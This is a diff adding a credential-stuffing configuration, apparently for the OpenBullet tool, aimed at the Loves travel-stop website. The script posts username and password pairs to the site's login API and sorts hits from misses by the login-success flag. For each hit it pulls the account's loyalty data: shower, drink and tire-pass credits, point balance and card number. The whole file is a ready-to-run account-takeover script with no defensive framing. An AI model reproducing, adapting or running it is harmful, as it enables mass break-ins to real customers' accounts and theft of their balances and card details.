@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Loves",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-20T03:38:56.7614532+00:00",
+  "AdditionalInfo": "",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.loves.com/api/sitecore/login/GetLoginResponse" AutoRedirect=TRUE 
+  CONTENT "{\"CardId\":\"\",\"CardPin\":\"\",\"UserName\":\"<USER>\",\"Password\":\"<PASS>\",\"FleetLogin\":true,\"RememberMe\":false,\"LoyaltyDashboardPath\":\"/en/lovesconnect/loyaltydashboard\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.loves.com/en/lovesconnect" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"IsLoginSuccess\":true" 
+  KEYCHAIN Failure OR 
+    KEY "IsLoginSuccess\":false" 
+REQUEST GET "https://www.loves.com/api/sitecore/LoyaltyDashboardAccounts/GetLoyaltyDetail" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.loves.com/en/lovesconnect/loyaltydashboard" 
+#Shower PARSE "<SOURCE>" LR "\"ShowerCredits\":" "," Recursive=FALSE -> CAP "Shower" "" "" 
+#Drink PARSE "<SOURCE>" LR "\"DrinkCredits\":" "," Recursive=FALSE -> CAP "Drink" "" "" 
+#Card PARSE "<SOURCE>" LR "\"CardNumber\":" "," Recursive=FALSE -> CAP "Card" "" "" 
+#Tire PARSE "<SOURCE>" LR "\"TirePassCredits\":" "," Recursive=FALSE -> CAP "TirePass" "" "" 
+#Points PARSE "<SOURCE>" LR "\"PointBalance\":" "," Recursive=FALSE -> CAP "Points" "" "" 
